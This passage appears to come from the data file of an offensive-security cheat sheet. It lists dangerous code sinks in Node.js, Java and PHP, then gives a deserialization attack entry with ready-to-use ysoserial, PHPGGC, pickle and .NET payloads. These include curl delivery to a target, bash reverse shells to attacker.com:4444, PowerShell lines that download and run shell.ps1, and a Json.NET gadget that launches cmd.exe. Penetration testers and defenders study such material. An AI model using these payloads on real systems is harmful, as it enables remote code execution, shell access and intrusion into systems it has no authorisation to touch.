spawn(cmd, args, {shell: true})   // shell option = dangerous
spawnSync(cmd, args, {shell: true})
eval(user_input)                  // Code execution
new Function(user_input)()
vm.runInNewContext(user_input)
vm.runInThisContext(user_input)
setTimeout(user_input, 0)         // String arg = eval
setInterval(user_input, 0)

// ── SQL INJECTION ────────────────────────────────
db.query("SELECT..." + input)
db.query(\`SELECT... \${input}\`)
knex.raw("SELECT..." + input)
sequelize.query("SELECT..." + input)
mongoose.find({$where: "..." + input})

// ── PATH TRAVERSAL ────────────────────────────────
fs.readFile(user_path)
fs.readFileSync(user_path)
fs.createReadStream(user_path)
path.join(__dirname, user_path)   // Bypassable with absolute path
res.sendFile(user_path)
require(user_path)

// ── XSS (SERVER-SIDE) ─────────────────────────────
res.send(user_input)
res.write(user_input)

// ── PROTOTYPE POLLUTION ──────────────────────────
_.merge(obj, user_input)          // Lodash < 4.17.12
_.extend(obj, user_input)
Object.assign(obj, user_input)    // When input has __proto__
deepmerge(obj, user_input)`
      },
      {
        title: 'Java & PHP sinks',
        code: `// ── JAVA COMMAND INJECTION ─────────────────────────
Runtime.getRuntime().exec(userInput)
new ProcessBuilder(userInput).start()

// ── JAVA SQL INJECTION ──────────────────────────
Statement.execute("SELECT..." + userInput)
Statement.executeQuery("SELECT..." + userInput)
entityManager.createNativeQuery("SELECT..." + userInput)
session.createQuery("FROM User WHERE name='" + userInput + "'")
// SAFE: PreparedStatement with setString()

// ── JAVA DESERIALIZATION ─────────────────────────
new ObjectInputStream(inputStream).readObject()
XMLDecoder.readObject()
XStream.fromXML(userInput)
JSON.parseObject(userInput, Object.class)  // Fastjson RCE

// ── JAVA EL INJECTION ───────────────────────────
new SpelExpressionParser().parseExpression(userInput).getValue()
ELProcessor.eval(userInput)
FreeMarker.process(userInput)
Velocity.evaluate(ctx, w, "", userInput)

// ════════════════════════════════════════════════
// ── PHP COMMAND INJECTION ─────────────────────
// system($in); exec($in); shell_exec($in);
// passthru($in); popen($in,'r'); \`$in\`

// ── PHP CODE EXECUTION ────────────────────────
// eval($in); assert($in); create_function('',$in);
// call_user_func($in); preg_replace('/.*/e',$in,'')

// ── PHP FILE INCLUSION ────────────────────────
// include($in); require($in);
// file_get_contents($in); file_put_contents($in,$d)

// ── PHP DESERIALIZATION ───────────────────────
// unserialize($in)  ← gadget chain RCE via PHPGGC`
      }
    ]
  },
  {
    id: 'deserialization',
    title: 'Deserialization Attacks',
    subtitle: 'Java, Python, PHP, and .NET gadget chains for unauthenticated RCE',
    tags: ['deserialization', 'gadget chain', 'ysoserial', 'PHPGGC', 'pickle RCE', 'Java RMI', 'BinaryFormatter'],
    accentColor: 'cyan',
    overview: 'Insecure deserialization allows an attacker to supply a crafted serialized object that triggers a chain of method calls ("gadget chain") during deserialization, resulting in arbitrary code execution. Often exploitable pre-authentication via cookies or POST bodies.',
    steps: [
      'Identify deserialization: base64 blobs in cookies, POST bodies, API params — look for magic bytes (Java: rO0A, PHP: O:, .NET: AAEAAAD)',
      'Identify the language/framework to select the correct gadget chains',
      'For Java: use ysoserial — try CommonsCollections1-6 first, then Spring, Groovy',
      'For PHP: use PHPGGC — list available chains and try Laravel, Symfony, Monolog',
      'For Python: craft a malicious pickle with __reduce__ returning (os.system, (cmd,))',
      'For .NET: use ysoserial.net with BinaryFormatter + TypeConfuseDelegate',
    ],
    commands: [
      {
        title: 'Java — ysoserial',
        code: `# https://github.com/frohoff/ysoserial

# List all gadget chains
java -jar ysoserial.jar --help

# Generate payload (base64)
java -jar ysoserial.jar CommonsCollections1 'id' | base64 -w0

# Try chains in order:
# CommonsCollections1   — Apache Commons Collections <= 3.1
# CommonsCollections2   — Commons Collections 4.0
# CommonsCollections6   — CC3.x bypass for Java 8u191+
# Spring1               — Spring Framework
# Spring2               — Spring Framework
# Groovy1               — Groovy
# Hibernate1            — Hibernate ORM
# URLDNS                — DNS pingback (detection only, no RCE)

# URLDNS — safe blind detection
java -jar ysoserial.jar URLDNS 'http://unique.attacker.com' | base64 -w0
# Send in cookie/body — watch DNS logs

# Send payload via curl
java -jar ysoserial.jar CommonsCollections1 'curl attacker.com/hit' | \\
  curl -s -X POST https://target.com/endpoint \\
    --data-binary @- \\
    -H "Content-Type: application/x-java-serialized-object"

# Java serialized magic bytes: AC ED 00 05
# Base64 starts with: rO0AB...`
      },
      {
        title: 'PHP — PHPGGC',
        code: `# https://github.com/ambionics/phpggc

phpggc -l                           # List all chains
phpggc -l Laravel                   # Laravel-specific chains
phpggc -l Symfony                   # Symfony chains
phpggc -l Monolog                   # Monolog (common dependency)

# Generate payloads
phpggc Laravel/RCE1 system id
phpggc Laravel/RCE1 system id -b    # Base64 encoded
phpggc Laravel/RCE1 system id -u    # URL encoded
phpggc Symfony/RCE4 exec id

# Reverse shell
phpggc Laravel/RCE1 system \\
  'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"' -b

# Key chains:
# Laravel/RCE1   — Laravel 5.5–8 (Faker)
# Laravel/RCE4   — Laravel 8+
# Symfony/RCE1   — Symfony 3.x
# Symfony/RCE4   — Symfony 4.x
# Monolog/RCE1   — Monolog (widely used)
# Guzzle/RCE1    — Guzzle HTTP library`
      },
      {
        title: 'Python pickle & YAML RCE',
        code: `import pickle, os, base64

# RCE via __reduce__
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)  # Send in cookie/session field

# Reverse shell
class RShell(object):
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(RShell())).decode()

# YAML RCE (yaml.load without Loader — PyYAML < 5.1)
import yaml
payload = b"!!python/object/apply:os.system ['id']"
yaml.load(payload)   # RCE — fix: yaml.safe_load()

# jsonpickle RCE
import jsonpickle
malicious = '{"py/object/apply": "os.system", "args": ["id"]}'
jsonpickle.decode(malicious)`
      },
      {
        title: '.NET — ysoserial.net',
        code: `# https://github.com/pwntester/ysoserial.net

# BinaryFormatter + TypeConfuseDelegate
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "calc.exe"

# PowerShell payload
ysoserial.exe -f BinaryFormatter -g PSObject \\
  -c "powershell.exe IEX(IWR http://attacker.com/shell.ps1)"

# Formatters:
# BinaryFormatter          — Most dangerous
# SoapFormatter            — Legacy SOAP
# ObjectStateFormatter     — ASP.NET ViewState
# LosFormatter             — Also ViewState
# NetDataContractSerializer — WCF

# Gadget chains:
# TypeConfuseDelegate      — Most universal
# PSObject                 — PowerShell
# WindowsPrincipal         — Windows auth
# ClaimsIdentity           — Claims auth

# ASP.NET ViewState exploitation (if MachineKey known or MAC disabled)
ysoserial.exe -p ViewState \\
  -g TypeConfuseDelegate \\
  -c "powershell.exe IEX(IWR http://attacker.com/shell.ps1)" \\
  --islegacy

# Json.NET TypeNameHandling=All — $type injection
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process",
    "StartInfo": {"FileName": "cmd.exe", "Arguments": "/c calc.exe"}
  }
}`
      }
    ]
  },
];